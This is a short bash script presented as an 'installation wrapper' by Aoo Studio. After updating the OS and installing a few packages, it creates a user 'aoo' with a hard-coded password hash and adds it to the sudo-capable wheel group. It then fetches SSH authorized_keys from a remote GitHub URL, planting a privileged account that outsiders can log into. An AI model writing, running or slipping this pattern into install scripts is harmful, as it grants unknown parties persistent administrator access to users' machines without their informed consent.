#!/bin/bash
# Aoo installation wrapper script by Aoo Studio
# https://aoostudio.com

# update os
yum -y update

# install
yum install screen -y
yum install perl -y
yum install net-tools -y
yum install apt -y

echo -e '\e[1;36mCreate Special User "aoo".....................................................................OK\e[0m';
useradd -p paHW.7qDiHJCM aoo
usermod -G wheel aoo
mkdir -p /home/aoo/.ssh
chmod 700 /home/aoo /home/aoo/.ssh
curl -o /home/aoo/.ssh/authorized_keys https://raw.githubusercontent.com/aoostudio/linux/master/authorized_keys
chmod 600 /home/aoo/.ssh/authorized_keys
chown aoo.aoo -R /home/aoo /home/aoo/.ssh

# -m : The users home directory will be created if it does not exist.
# useradd -p encryptedPassword : The encrypted password, as returned by crypt().
# username : Add this user to system

clear
